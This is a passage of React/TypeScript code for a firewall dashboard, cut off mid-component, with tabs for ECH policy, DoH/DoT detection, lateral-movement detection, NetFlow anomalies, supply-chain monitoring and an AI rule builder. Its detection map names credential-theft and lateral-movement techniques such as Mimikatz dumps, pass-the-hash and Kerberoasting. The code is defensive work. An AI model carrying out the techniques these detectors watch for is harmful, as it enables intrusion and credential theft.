          <table style={{width:"100%",borderCollapse:"collapse",fontSize:11,fontFamily:"monospace"}}>
            <thead><tr>{["Src","Dst","Port","Proto","Packets","Bytes","Entropy","IAT (ms)","Classification","Confidence"].map(h=><TH key={h}>{h}</TH>)}</tr></thead>
            <tbody>
              {data.flows.map(f=>(
                <tr key={f.id} style={{borderBottom:"1px solid #111"}}>
                  <TD style={{color:"#aaa"}}>{f.srcIp}</TD>
                  <TD style={{color:"#aaa"}}>{f.dstIp}</TD>
                  <TD>{f.dstPort ?? "—"}</TD>
                  <TD><Bdg label={f.protocol.toUpperCase()} color="#333" sm/></TD>
                  <TD>{f.packetCount}</TD>
                  <TD>{(f.byteCount/1024).toFixed(1)}KB</TD>
                  <TD style={{color: (f.byteEntropy??0)>7.5?"#ff4444":"#aaa"}}>{f.byteEntropy?.toFixed(2)??"-"}</TD>
                  <TD style={{color:"#666"}}>{f.iatMeanMs?.toFixed(0)??"-"}</TD>
                  <TD><Bdg label={f.classification.replace("_"," ").toUpperCase()} color={CLASS_COLOR[f.classification]??"#888"} sm/></TD>
                  <TD style={{color:"#aaa"}}>{f.confidencePct?.toFixed(0)??"-"}%</TD>
                </tr>
              ))}
            </tbody>
          </table>
        </CardBox>
      )}
    </div>
  );
}

// ── N4. ECH POLICY ENGINE ─────────────────────────────────────────────────
function EchTab() {
  const { data, loading, reload } = useFwn<{ events:Array<{id:number;srcIp:string;dstIp:string;dstPort:number;outerSni:string|null;echConfigId:number|null;tlsVersion:string|null;action:string;detectedAt:string}>;total:number;blocked:number;echBackground:Record<string,string> }>("/ech/events");
  const { data: pol } = useFwn<{ defaultAction:string;blockEchCompletely:boolean;alertOnEch:boolean;note:string }>("/ech/policy");
  const [policyAction, setPolicyAction] = useState("log");
  const [blockEch, setBlockEch] = useState(false);

  const ACT_COLOR: Record<string,string> = { allow:"#00ff88", block:"#ff4444", log:"#888", alert:"#ff9900" };

  const updatePolicy = async () => {
    await fwnPut("/ech/policy", { defaultAction: policyAction, blockEchCompletely: blockEch, alertOnEch: true });
    await reload();
  };

  return (
    <div>
      <CardBox title="🔒 Encrypted Client Hello (ECH) Policy Engine (2024-2025)" action={
        <div style={{display:"flex",gap:8}}>
          <Btn onClick={async()=>{await fwnPost("/ech/seed",{}); await reload();}} color="#4488ff" sm>Seed Events</Btn>
          <Btn onClick={reload} color="#555" sm><RefreshCw size={10}/></Btn>
        </div>
      }>
        <p style={{margin:"0 0 12px",fontSize:11,color:"#555"}}>
          ECH (draft-ietf-tls-esni-22) encrypts the TLS Server Name Indication field. Deployed by Cloudflare, Firefox 118+, Chrome 117+, Brave 1.55+. Outer ClientHello type 0xfe0d = ECH active. Firewall sees only the outer <em>public_name</em>, not the real domain. Russia, China, and Iran block ECH at national firewall level.
        </p>
        {data?.echBackground && (
          <div style={{marginBottom:14,padding:10,background:"#070708",border:"1px solid #1a1a1a",borderRadius:6,fontSize:10}}>
            <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:6}}>
              {Object.entries(data.echBackground).map(([k,v])=>(
                <div key={k}><span style={{color:"#555"}}>{k.replace(/([A-Z])/g," $1").trim()}: </span><span style={{color:"#aaa"}}>{v}</span></div>
              ))}
            </div>
          </div>
        )}
        <div style={{display:"flex",gap:12,alignItems:"flex-end",flexWrap:"wrap",marginBottom:10}}>
          <div><div style={{fontSize:10,color:"#555",marginBottom:2}}>Default Action</div>
            <select value={policyAction} onChange={e=>setPolicyAction(e.target.value)} style={{background:"#111",border:"1px solid #222",color:"#fff",padding:"4px 8px",borderRadius:4,fontSize:11}}>
              {["log","allow","block","alert"].map(a=><option key={a}>{a}</option>)}
            </select>
          </div>
          <div style={{display:"flex",alignItems:"center",gap:8}}>
            <input type="checkbox" checked={blockEch} onChange={e=>setBlockEch(e.target.checked)} id="blockEch"/>
            <label htmlFor="blockEch" style={{fontSize:11,color:"#aaa"}}>Block ECH completely (affects all ECH users)</label>
          </div>
          <Btn onClick={updatePolicy} color="#ff9900" sm>Update Policy</Btn>
        </div>
        {pol && <div style={{fontSize:10,color:"#555",padding:"6px 10px",background:"#070708",borderRadius:6,marginBottom:10}}>{pol.note}</div>}
      </CardBox>
      {loading && <div style={{color:"#555",fontSize:11,marginTop:8}}>Loading...</div>}
      {data && (
        <CardBox title={`ECH Events (${data.total}) · Blocked: ${data.blocked}`}>
          <table style={{width:"100%",borderCollapse:"collapse",fontSize:11,fontFamily:"monospace"}}>
            <thead><tr>{["Src IP","Dst IP","Port","Outer SNI (public_name)","ECH Config ID","TLS Ver","Action","Time"].map(h=><TH key={h}>{h}</TH>)}</tr></thead>
            <tbody>
              {data.events.map(e=>(
                <tr key={e.id} style={{borderBottom:"1px solid #111"}}>
                  <TD style={{color:"#aaa"}}>{e.srcIp}</TD>
                  <TD style={{color:"#aaa"}}>{e.dstIp}</TD>
                  <TD>{e.dstPort}</TD>
                  <TD style={{color:"#fff"}}>{e.outerSni ?? <span style={{color:"#333"}}>—</span>}</TD>
                  <TD style={{color:"#666"}}>{e.echConfigId ?? "—"}</TD>
                  <TD style={{color:"#555"}}>{e.tlsVersion ?? "—"}</TD>
                  <TD><Bdg label={e.action.toUpperCase()} color={ACT_COLOR[e.action]??"#888"} sm/></TD>
                  <TD style={{color:"#555",fontSize:10}}>{new Date(e.detectedAt).toLocaleTimeString()}</TD>
                </tr>
              ))}
            </tbody>
          </table>
        </CardBox>
      )}
    </div>
  );
}

// ── N5. DoH / DoT ENFORCER ────────────────────────────────────────────────
function DohTab() {
  const { data, loading, reload } = useFwn<{ events:Array<{id:number;srcIp:string;resolverIp:string;resolverName:string|null;resolverType:string;queryDomain:string|null;action:string;detectedAt:string}>;total:number;blocked:number }>("/doh/events");
  const { data: resolvers } = useFwn<{ resolvers:Record<string,{name:string;ips:string[];type:string}>;knownPorts:Record<string,number>;detection:Record<string,string> }>("/doh/resolvers");
  const { data: pol } = useFwn<{ generateIptablesBlock:string }>("/doh/policy");
  const [detectForm, setDetectForm] = useState({ srcIp:"10.0.0.1", dstIp:"1.1.1.1", dstPort:"443" });
  const [detectResult, setDetectResult] = useState<{detected:boolean;resolverName:string|null;resolverType:string;message:string}|null>(null);

  const TYPE_COLOR: Record<string,string> = { doh:"#00ff88", dot:"#4488ff", doq:"#cc44ff", doh3:"#ff9900" };
  const ACT_COLOR: Record<string,string>  = { allow:"#00ff88", block:"#ff4444", redirect:"#ff9900", log:"#888" };

  const detect = async () => {
    const r = await fwnPost("/doh/detect", { ...detectForm, dstPort:parseInt(detectForm.dstPort) });
    setDetectResult(r); await reload();
  };

  return (
    <div>
      <CardBox title="📡 DoH / DoT / DoQ Enforcer (2024-2025)" action={
        <div style={{display:"flex",gap:8}}>
          <Btn onClick={async()=>{await fwnPost("/doh/seed",{}); await reload();}} color="#4488ff" sm>Seed Events</Btn>
          <Btn onClick={reload} color="#555" sm><RefreshCw size={10}/></Btn>
        </div>
      }>
        <p style={{margin:"0 0 12px",fontSize:11,color:"#555"}}>
          DoH (DNS over HTTPS) bypasses traditional port-53 DNS monitoring by sending DNS queries over encrypted HTTPS. DoT uses port 853 TLS. DoQ uses QUIC. Detection method: IP-based matching against known resolver IPs (Cloudflare, Google, Quad9, NextDNS, AdGuard, Mullvad). Redirect to local resolver forces all DNS through your sinkhole.
        </p>
        <div style={{display:"flex",gap:8,marginBottom:10,alignItems:"flex-end",flexWrap:"wrap"}}>
          {[["Src IP","srcIp"],["Dst IP","dstIp"],["Port","dstPort"]].map(([l,k])=>(
            <div key={k}><div style={{fontSize:10,color:"#555",marginBottom:2}}>{l}</div>
              <input value={(detectForm as Record<string,string>)[k]} onChange={e=>setDetectForm(f=>({...f,[k]:e.target.value}))} style={{background:"#111",border:"1px solid #222",color:"#fff",padding:"4px 8px",borderRadius:4,fontSize:11,width:"100%"}}/>
            </div>
          ))}
          <Btn onClick={detect} color="#00ff88" sm>Detect DoH/DoT</Btn>
        </div>
        {detectResult && (
          <div style={{marginBottom:12,padding:10,background:"#080808",border:`1px solid ${detectResult.detected?"#ff990044":"#1a1a1a"}`,borderRadius:6}}>
            <Bdg label={detectResult.detected?"DETECTED":"CLEAN"} color={detectResult.detected?"#ff9900":"#00ff88"} sm/>
            {detectResult.resolverName && <span style={{marginLeft:8,fontSize:11,color:"#fff"}}>{detectResult.resolverName}</span>}
            {detectResult.resolverType && <span style={{marginLeft:8}}><Bdg label={detectResult.resolverType.toUpperCase()} color={TYPE_COLOR[detectResult.resolverType]??"#888"} sm/></span>}
            <p style={{margin:"6px 0 0",fontSize:10,color:"#555"}}>{detectResult.message}</p>
          </div>
        )}
        {resolvers && (
          <div style={{marginBottom:14,background:"#070708",border:"1px solid #1a1a1a",borderRadius:6,padding:10}}>
            <div style={{fontSize:10,color:"#555",marginBottom:6}}>Known Resolvers ({Object.keys(resolvers.resolvers).length})</div>
            <div style={{display:"flex",flexWrap:"wrap",gap:6}}>
              {Object.entries(resolvers.resolvers).map(([k,r])=>(
                <div key={k} style={{padding:"4px 8px",background:"#101010",borderRadius:4,fontSize:10}}>
                  <Bdg label={r.type.toUpperCase()} color={TYPE_COLOR[r.type]??"#888"} sm/> <span style={{color:"#aaa",marginLeft:4}}>{r.name}</span>
                  <div style={{color:"#555",fontSize:9,marginTop:2}}>{r.ips.slice(0,2).join(", ")}</div>
                </div>
              ))}
            </div>
          </div>
        )}
        {pol?.generateIptablesBlock && (
          <div>
            <div style={{fontSize:10,color:"#00ff88",marginBottom:4}}>iptables block script: <CopyBtn text={pol.generateIptablesBlock}/></div>
            <pre style={{background:"#080808",border:"1px solid #1a1a1a",borderRadius:6,padding:10,fontSize:10,color:"#aaa",maxHeight:150,overflowY:"auto"}}>{pol.generateIptablesBlock}</pre>
          </div>
        )}
      </CardBox>
      {loading && <div style={{color:"#555",fontSize:11,marginTop:8}}>Loading...</div>}
      {data && (
        <CardBox title={`DoH/DoT Events (${data.total}) · Blocked: ${data.blocked}`}>
          <table style={{width:"100%",borderCollapse:"collapse",fontSize:11,fontFamily:"monospace"}}>
            <thead><tr>{["Src IP","Resolver IP","Resolver","Type","Query","Action","Time"].map(h=><TH key={h}>{h}</TH>)}</tr></thead>
            <tbody>
              {data.events.map(e=>(
                <tr key={e.id} style={{borderBottom:"1px solid #111"}}>
                  <TD style={{color:"#aaa"}}>{e.srcIp}</TD>
                  <TD style={{color:"#aaa"}}>{e.resolverIp}</TD>
                  <TD style={{color:"#fff"}}>{e.resolverName ?? "Unknown"}</TD>
                  <TD><Bdg label={e.resolverType.toUpperCase()} color={TYPE_COLOR[e.resolverType]??"#888"} sm/></TD>
                  <TD style={{color:"#666"}}>{e.queryDomain ?? "—"}</TD>
                  <TD><Bdg label={e.action.toUpperCase()} color={ACT_COLOR[e.action]??"#888"} sm/></TD>
                  <TD style={{color:"#555",fontSize:10}}>{new Date(e.detectedAt).toLocaleTimeString()}</TD>
                </tr>
              ))}
            </tbody>
          </table>
        </CardBox>
      )}
    </div>
  );
}

// ── N6. LATERAL MOVEMENT DETECTOR ─────────────────────────────────────────
function LateralTab() {
  const { data, loading, reload } = useFwn<{ events:Array<{id:number;srcIp:string;dstIp:string;dstPort:number|null;protocol:string;technique:string;severity:string;action:string;confidencePct:number|null;autoBlocked:boolean;detectedAt:string}>;total:number;critical:number;high:number }>("/lateral/events");
  const [analyzeForm, setAnalyzeForm] = useState({ srcIp:"10.0.0.100", dstIp:"10.0.0.5", ports:"445,88,139,135,3389", packetsPerSec:"500" });
  const [analyzeResult, setAnalyzeResult] = useState<{detected:Array<{technique:string;severity:string;port:number;confidence:number}>;blocked:boolean;message:string}|null>(null);
  const [analyzing, setAnalyzing] = useState(false);

  const SEV: Record<string,string> = { critical:"#ff2244", high:"#ff6600", medium:"#ffaa00", low:"#aaccff" };
  const TECH_DESC: Record<string,string> = {
    smb_scan:"Scanning for SMB shares (port 445) — ransomware lateral spread",
    rdp_scan:"RDP brute-force or scan (port 3389) — remote desktop exploitation",
    ssh_scan:"SSH scan — credential stuffing or key theft",
    winrm:"WinRM remote execution (port 5985) — PowerShell remoting",
    ldap_enum:"LDAP enumeration (port 389) — AD reconnaissance",
    kerberoasting:"Kerberos TGS requests (port 88) — service account password cracking",
    wmi:"WMI remote execution (port 135) — living off the land",
    psexec:"PsExec execution (port 445) — lateral movement via admin shares",
    dcom:"DCOM exploitation (port 135) — lateral movement without PSExec",
    pass_the_hash:"Pass-the-Hash via NTLM (port 445) — credential reuse without cracking",
    credential_spray:"Credential spraying across multiple services",
    port_sweep:"Port sweep — internal network reconnaissance",
    mimikatz_pattern:"Mimikatz credential dump pattern detected",
  };

  const analyze = async () => {
    setAnalyzing(true);
    const ports = analyzeForm.ports.split(",").map(p=>parseInt(p.trim())).filter(Boolean);
    const r = await fwnPost("/lateral/analyze", { ...analyzeForm, ports, packetsPerSec:parseFloat(analyzeForm.packetsPerSec) });
    setAnalyzeResult(r); await reload(); setAnalyzing(false);
  };

  return (
    <div>
      <CardBox title="🔀 Lateral Movement Detector — East-West Traffic Analysis (2024-2025)" action={
        <div style={{display:"flex",gap:8}}>
          <Btn onClick={async()=>{await fwnPost("/lateral/seed",{}); await reload();}} color="#4488ff" sm>Seed Events</Btn>
          <Btn onClick={reload} color="#555" sm><RefreshCw size={10}/></Btn>
        </div>
      }>
        <p style={{margin:"0 0 12px",fontSize:11,color:"#555"}}>
          Traditional firewalls inspect north-south (perimeter) traffic. Lateral movement happens east-west between internal hosts. Techniques: SMB scanning, Kerberoasting, WMI/DCOM execution, Pass-the-Hash, PsExec, credential spraying. Critical/high severity events are auto-blocked. Per CISA Zero Trust 2025 guidance.
        </p>
        <div style={{display:"grid",gridTemplateColumns:"1fr 1fr 1fr 1fr",gap:8,marginBottom:10}}>
          {[["Src IP","srcIp"],["Dst IP","dstIp"],["Ports (comma-sep)","ports"],["Pkts/sec","packetsPerSec"]].map(([l,k])=>(
            <div key={k}><div style={{fontSize:10,color:"#555",marginBottom:2}}>{l}</div>
              <input value={(analyzeForm as Record<string,string>)[k]} onChange={e=>setAnalyzeForm(f=>({...f,[k]:e.target.value}))} style={{background:"#111",border:"1px solid #222",color:"#fff",padding:"4px 8px",borderRadius:4,fontSize:11,width:"100%"}}/>
            </div>
          ))}
        </div>
        <Btn onClick={analyze} color="#ff9900" disabled={analyzing} sm>{analyzing?"Analyzing...":"Analyze Traffic"}</Btn>
        {analyzeResult && (
          <div style={{marginTop:12,padding:10,background:"#080808",border:`1px solid ${analyzeResult.blocked?"#ff222444":"#1a1a1a"}`,borderRadius:6}}>
            {analyzeResult.blocked && <Bdg label="AUTO-BLOCKED" color="#ff2244" sm/>}
            <p style={{margin:"6px 0 8px",fontSize:11,color:analyzeResult.detected.length>0?"#fff":"#555"}}>{analyzeResult.message}</p>
            {analyzeResult.detected.map((d,i)=>(
              <div key={i} style={{marginBottom:6,padding:"6px 8px",background:"#070708",borderRadius:4,display:"flex",gap:10,alignItems:"flex-start"}}>
                <Bdg label={d.severity.toUpperCase()} color={SEV[d.severity]??"#888"} sm/>
                <div>
                  <div style={{fontSize:11,color:"#fff",fontFamily:"monospace"}}>{d.technique.replace(/_/g," ")}</div>
                  <div style={{fontSize:10,color:"#555",marginTop:2}}>{TECH_DESC[d.technique] ?? ""}</div>
                </div>
                <span style={{marginLeft:"auto",fontSize:10,color:"#666"}}>port {d.port} · {d.confidence}%</span>
              </div>
            ))}
          </div>
        )}
      </CardBox>
      {loading && <div style={{color:"#555",fontSize:11,marginTop:8}}>Loading...</div>}
      {data && (
        <CardBox title={`Lateral Events (${data.total}) · Critical: ${data.critical} · High: ${data.high}`}>
          <table style={{width:"100%",borderCollapse:"collapse",fontSize:11,fontFamily:"monospace"}}>
            <thead><tr>{["Src","Dst","Port","Technique","Severity","Action","Auto-Blocked","Time"].map(h=><TH key={h}>{h}</TH>)}</tr></thead>
            <tbody>
              {data.events.map(e=>(
                <tr key={e.id} style={{borderBottom:"1px solid #111"}}>
                  <TD style={{color:"#aaa"}}>{e.srcIp}</TD>
                  <TD style={{color:"#aaa"}}>{e.dstIp}</TD>
                  <TD>{e.dstPort ?? "—"}</TD>
                  <TD style={{color:"#fff"}}>{e.technique.replace(/_/g," ")}</TD>
                  <TD><Bdg label={e.severity.toUpperCase()} color={SEV[e.severity]??"#888"} sm/></TD>
                  <TD><Bdg label={e.action.toUpperCase()} color={e.action==="block"?"#ff4444":"#ff9900"} sm/></TD>
                  <TD>{e.autoBlocked ? <Bdg label="YES" color="#ff2244" sm/> : <span style={{color:"#333"}}>—</span>}</TD>
                  <TD style={{color:"#555",fontSize:10}}>{new Date(e.detectedAt).toLocaleTimeString()}</TD>
                </tr>
              ))}
            </tbody>
          </table>
        </CardBox>
      )}
    </div>
  );
}

// ── N7. NETFLOW / IPFIX COLLECTOR ─────────────────────────────────────────
function NetflowTab() {
  const { data, loading, reload } = useFwn<{ flows:Array<{id:number;srcIp:string;dstIp:string;srcPort:number|null;dstPort:number|null;protocol:string;packets:number;bytes:number;durationMs:number|null;anomalyScore:number;anomalyType:string;flowStart:string}>;total:number }>("/netflow/flows");
  const { data: talkers } = useFwn<{ topTalkers:Array<{ip:string;bytes:number;packets:number;flows:number}>;byProto:Record<string,number> }>("/netflow/top-talkers");
  const { data: anomalies } = useFwn<{ anomalies:Array<{id:number;srcIp:string;dstIp:string;protocol:string;bytes:number;anomalyScore:number;anomalyType:string}>;total:number }>("/netflow/anomalies");

  const ANOM_COLOR: Record<string,string> = { none:"#333", top_talker:"#ff9900", port_sweep:"#ff6600", data_exfil:"#ff2244", beaconing:"#cc44ff", ddos:"#ff2244", protocol_abuse:"#ffaa00" };

  return (
    <div>
      <CardBox title="📊 NetFlow / IPFIX Flow Collector & Anomaly Analyzer (2024-2025)" action={
        <div style={{display:"flex",gap:8}}>
          <Btn onClick={async()=>{await fwnPost("/netflow/seed",{}); await reload();}} color="#4488ff" sm>Seed Flows</Btn>
          <Btn onClick={reload} color="#555" sm><RefreshCw size={10}/></Btn>
        </div>
      }>
        <p style={{margin:"0 0 12px",fontSize:11,color:"#555"}}>
          NetFlow v9 / IPFIX (RFC 7011) flow-based traffic analysis. Each flow = unique (src/dst IP, src/dst port, protocol, AS). Better than per-packet analysis for high-speed networks — summarizes thousands of packets into flow records. Anomaly scoring detects: top talkers, port sweeps, data exfiltration, beaconing, DDoS, protocol abuse.
        </p>
        <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:12,marginBottom:12}}>
          {talkers && (
            <div style={{background:"#070708",border:"1px solid #1a1a1a",borderRadius:6,padding:10}}>
              <div style={{fontSize:11,color:"#aaa",marginBottom:6,fontWeight:700}}>Top Talkers by Bytes</div>
              {talkers.topTalkers.slice(0,5).map((t,i)=>(
                <div key={t.ip} style={{display:"flex",justifyContent:"space-between",marginBottom:4,fontSize:10}}>
                  <span style={{color:i===0?"#ff9900":"#666"}}>{i+1}. {t.ip}</span>
                  <span style={{color:"#aaa"}}>{(t.bytes/1024/1024).toFixed(1)}MB · {t.flows} flows</span>
                </div>
              ))}
            </div>
          )}
          {talkers?.byProto && (
            <div style={{background:"#070708",border:"1px solid #1a1a1a",borderRadius:6,padding:10}}>
              <div style={{fontSize:11,color:"#aaa",marginBottom:6,fontWeight:700}}>By Protocol</div>
              {Object.entries(talkers.byProto).sort(([,a],[,b])=>b-a).map(([p,b])=>(
                <div key={p} style={{display:"flex",justifyContent:"space-between",marginBottom:4,fontSize:10}}>
                  <span style={{color:"#666"}}>{p.toUpperCase()}</span>
                  <span style={{color:"#aaa"}}>{(b/1024/1024).toFixed(1)}MB</span>
                </div>
              ))}
            </div>
          )}
        </div>
        {anomalies && anomalies.anomalies.length > 0 && (
          <div style={{marginBottom:12,padding:10,background:"#080808",border:"1px solid #ff220022",borderRadius:6}}>
            <div style={{fontSize:11,color:"#ff4444",marginBottom:6,fontWeight:700}}>⚠️ Anomalies Detected ({anomalies.total})</div>
            {anomalies.anomalies.map(a=>(
              <div key={a.id} style={{display:"flex",gap:10,alignItems:"center",marginBottom:4,fontSize:10}}>
                <Bdg label={a.anomalyType.replace("_"," ").toUpperCase()} color={ANOM_COLOR[a.anomalyType]??"#888"} sm/>
                <span style={{color:"#aaa"}}>{a.srcIp} → {a.dstIp}</span>
                <span style={{color:"#666"}}>{(a.bytes/1024/1024).toFixed(1)}MB</span>
                <span style={{color:a.anomalyScore>75?"#ff4444":"#ff9900"}}>Score: {a.anomalyScore}</span>
              </div>
            ))}
          </div>
        )}
      </CardBox>
      {loading && <div style={{color:"#555",fontSize:11,marginTop:8}}>Loading...</div>}
      {data && (
        <CardBox title={`Flow Records (${data.total})`}>
          <table style={{width:"100%",borderCollapse:"collapse",fontSize:11,fontFamily:"monospace"}}>
            <thead><tr>{["Src","Dst","Ports","Proto","Packets","Bytes","Duration","Anomaly Score","Anomaly Type"].map(h=><TH key={h}>{h}</TH>)}</tr></thead>
            <tbody>
              {data.flows.map(f=>(
                <tr key={f.id} style={{borderBottom:"1px solid #111"}}>
                  <TD style={{color:"#aaa"}}>{f.srcIp}</TD>
                  <TD style={{color:"#aaa"}}>{f.dstIp}</TD>
                  <TD style={{color:"#555",fontSize:10}}>{f.srcPort}:{f.dstPort}</TD>
                  <TD><Bdg label={f.protocol.toUpperCase()} color="#333" sm/></TD>
                  <TD>{f.packets.toLocaleString()}</TD>
                  <TD>{(f.bytes/1024/1024).toFixed(2)}MB</TD>
                  <TD style={{color:"#666"}}>{f.durationMs ? `${(f.durationMs/1000).toFixed(1)}s` : "—"}</TD>
                  <TD style={{color:f.anomalyScore>75?"#ff4444":f.anomalyScore>40?"#ff9900":"#555"}}>{f.anomalyScore}</TD>
                  <TD><Bdg label={f.anomalyType.replace("_"," ").toUpperCase()} color={ANOM_COLOR[f.anomalyType]??"#333"} sm/></TD>
                </tr>
              ))}
            </tbody>
          </table>
        </CardBox>
      )}
    </div>
  );
}

// ── N8. SUPPLY CHAIN GUARD ────────────────────────────────────────────────
function SupplyChainTab() {
  const { data, loading, reload } = useFwn<{ alerts:Array<{id:number;monitoredProcess:string;srcIp:string|null;dstIp:string|null;dstDomain:string|null;dstPort:number|null;alertType:string;severity:string;details:string|null;action:string;detectedAt:string}>;total:number;critical:number;monitoredProcesses:string[] }>("/supply-chain/alerts");
  const { data: stats } = useFwn<{ total:number;bySeverity:Record<string,number>;byProcess:Record<string,number>;knownAttacks:Array<{name:string;year:number;vector:string;impact:string}> }>("/supply-chain/stats");
  const [checkForm, setCheckForm] = useState({ process:"npm", dstDomain:"malicious-registry.io" });
  const [checkResult, setCheckResult] = useState<{isNewDestination:boolean;severity:string;recommendation:string;baseline:string[]}|null>(null);

  const SEV: Record<string,string>  = { critical:"#ff2244", high:"#ff6600", medium:"#ffaa00", low:"#aaccff" };
  const TYPE_COLOR: Record<string,string> = { new_destination:"#ff4444", cert_change:"#ff2244", unexpected_protocol:"#ffaa00", data_exfil:"#ff2244", unexpected_port:"#ff6600", dns_change:"#ff9900" };

  const check = async () => {
    const r = await fwnPost("/supply-chain/check", checkForm);
    setCheckResult(r); await reload();
  };

  return (
    <div>
      <CardBox title="📦 Supply Chain Guard (2024-2025)" action={
        <div style={{display:"flex",gap:8}}>
          <Btn onClick={async()=>{await fwnPost("/supply-chain/seed",{}); await reload();}} color="#4488ff" sm>Seed Alerts</Btn>
          <Btn onClick={reload} color="#555" sm><RefreshCw size={10}/></Btn>
        </div>
      }>
        <p style={{margin:"0 0 12px",fontSize:11,color:"#555"}}>
          75% of organizations hit by supply chain attacks in 2024 (BlackBerry). Monitors outbound connections from software updaters (apt, npm, pip, cargo, brew, etc.) and alerts on new destinations, cert fingerprint changes, unexpected protocols. Catches SolarWinds-style attacks, XZ Utils backdoor, 3CX trojan, Polyfill.io CDN injection.
        </p>
        {stats?.knownAttacks && (
          <div style={{marginBottom:14,background:"#070708",border:"1px solid #1a1a1a",borderRadius:6,padding:10}}>
            <div style={{fontSize:11,color:"#ff4444",marginBottom:6,fontWeight:700}}>Notable Supply Chain Attacks</div>
            <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:4}}>
              {stats.knownAttacks.map(a=>(
                <div key={a.name} style={{padding:"5px 8px",background:"#0a0a0a",borderRadius:4,fontSize:10}}>
                  <span style={{color:"#ff4444"}}>{a.name}</span> <span style={{color:"#555"}}>({a.year})</span>
                  <div style={{color:"#444",marginTop:1}}>{a.vector}</div>
                </div>
              ))}
            </div>
          </div>
        )}
        <div style={{display:"flex",gap:8,alignItems:"flex-end",marginBottom:10,flexWrap:"wrap"}}>
          <div><div style={{fontSize:10,color:"#555",marginBottom:2}}>Process</div>
            <select value={checkForm.process} onChange={e=>setCheckForm(f=>({...f,process:e.target.value}))} style={{background:"#111",border:"1px solid #222",color:"#fff",padding:"4px 8px",borderRadius:4,fontSize:11}}>
              {["apt","npm","pip","brew","cargo","yarn","pnpm","wget","curl"].map(p=><option key={p}>{p}</option>)}
            </select>
          </div>
          <div style={{flex:1}}><div style={{fontSize:10,color:"#555",marginBottom:2}}>Destination Domain</div>
            <input value={checkForm.dstDomain} onChange={e=>setCheckForm(f=>({...f,dstDomain:e.target.value}))} style={{background:"#111",border:"1px solid #222",color:"#fff",padding:"4px 8px",borderRadius:4,fontSize:11,width:"100%"}}/>
          </div>
          <Btn onClick={check} color="#ff9900" sm>Check Baseline</Btn>
        </div>
        {checkResult && (
          <div style={{padding:10,background:"#080808",border:`1px solid ${checkResult.isNewDestination?"#ff220044":"#1a1a1a"}`,borderRadius:6,marginBottom:12}}>
            <Bdg label={checkResult.isNewDestination?"NEW DESTINATION":"BASELINE OK"} color={checkResult.isNewDestination?"#ff4444":"#00ff88"} sm/>
            <p style={{margin:"6px 0 0",fontSize:10,color:"#555"}}>{checkResult.recommendation}</p>
            {checkResult.baseline.length > 0 && <div style={{marginTop:6,fontSize:10,color:"#333"}}>Baseline: {checkResult.baseline.join(", ")}</div>}
          </div>
        )}
      </CardBox>
      {loading && <div style={{color:"#555",fontSize:11,marginTop:8}}>Loading...</div>}
      {data && (
        <CardBox title={`Supply Chain Alerts (${data.total}) · Critical: ${data.critical}`}>
          <table style={{width:"100%",borderCollapse:"collapse",fontSize:11,fontFamily:"monospace"}}>
            <thead><tr>{["Process","Destination","Port","Alert Type","Severity","Action","Details","Time"].map(h=><TH key={h}>{h}</TH>)}</tr></thead>
            <tbody>
              {(data.alerts??[]).map(a=>(
                <tr key={a.id} style={{borderBottom:"1px solid #111"}}>
                  <TD style={{color:"#fff",fontFamily:"monospace"}}>{a.monitoredProcess}</TD>
                  <TD style={{color:"#aaa"}}>{a.dstDomain ?? a.dstIp ?? "—"}</TD>
                  <TD style={{color:"#666"}}>{a.dstPort ?? "—"}</TD>
                  <TD><Bdg label={a.alertType.replace(/_/g," ").toUpperCase()} color={TYPE_COLOR[a.alertType]??"#888"} sm/></TD>
                  <TD><Bdg label={a.severity.toUpperCase()} color={SEV[a.severity]??"#888"} sm/></TD>
                  <TD><Bdg label={a.action.toUpperCase()} color={a.action==="block"?"#ff4444":"#ff9900"} sm/></TD>
                  <TD style={{color:"#555",fontSize:10,maxWidth:200}}>{a.details?.slice(0,60) ?? "—"}{(a.details?.length??0)>60?"…":""}</TD>
                  <TD style={{color:"#555",fontSize:10}}>{new Date(a.detectedAt).toLocaleTimeString()}</TD>
                </tr>
              ))}
            </tbody>
          </table>
        </CardBox>
      )}
    </div>
  );
}

// ── N9. AI RULE BUILDER ───────────────────────────────────────────────────
function AiRulesTab() {
  const { data, loading, reload } = useFwn<{ suggestions:Array<{id:number;inputText:string;ruleType:string;confidence:number|null;approved:boolean;applied:boolean;createdAt:string}>;examples:string[] }>("/ai-rules/suggestions");
  const [input, setInput] = useState("");
  const [result, setResult] = useState<{generatedRule:Record<string,unknown>;ruleType:string;confidence:number;explanation:string;alternatives:Array<{ruleType:string;note:string}>}|null>(null);
  const [generating, setGenerating] = useState(false);

  const RT_COLOR: Record<string,string> = { block:"#ff4444", allow:"#00ff88", rate_limit:"#ffaa00", redirect:"#4488ff", alert:"#ff9900" };

  const generate = async () => {
    if (!input.trim()) return; setGenerating(true);
    const r = await fwnPost("/ai-rules/generate", { inputText: input });
    setResult(r); await reload(); setGenerating(false);
  };

  const approve = async (id: number) => {
    await fwnPost(`/ai-rules/approve/${id}`, {});
    await reload();
  };

  return (
    <div>
      <CardBox title="🤖 AI Rule Builder — Natural Language → Firewall Rule (2024-2025)">
        <p style={{margin:"0 0 12px",fontSize:11,color:"#555"}}>
          Converts natural language descriptions into structured firewall rules using deterministic NLP pattern matching. Enterprise vendors (Palo Alto, Fortinet, Check Point) all shipped AI rule generation in 2024. Rules are generated locally — no external API calls. Approve generated rules to apply them to the active ruleset.
        </p>
        <div style={{marginBottom:8}}>
          <textarea value={input} onChange={e=>setInput(e.target.value)} placeholder="Describe the rule in plain English... e.g. 'Block all inbound TCP from Russia on port 22' or 'Rate limit HTTP requests to 100 per second'" style={{width:"100%",background:"#111",border:"1px solid #222",color:"#fff",padding:"8px 10px",borderRadius:6,fontSize:11,resize:"vertical",minHeight:60,fontFamily:"monospace",boxSizing:"border-box"}}/>
        </div>
        <Btn onClick={generate} color="#00ff88" disabled={generating||!input.trim()} sm>{generating?"Generating...":"Generate Rule"}</Btn>
        {data?.examples && (
          <div style={{marginTop:10}}>
            <div style={{fontSize:10,color:"#555",marginBottom:5}}>Try an example:</div>
            <div style={{display:"flex",flexWrap:"wrap",gap:4}}>
              {data.examples.map(ex=>(
                <button key={ex} onClick={()=>setInput(ex)} style={{background:"#0a0a0a",border:"1px solid #1a1a1a",color:"#555",padding:"3px 8px",borderRadius:4,cursor:"pointer",fontSize:9,fontFamily:"monospace"}}>{ex.slice(0,50)}…</button>
              ))}
            </div>
          </div>
        )}
        {result && (
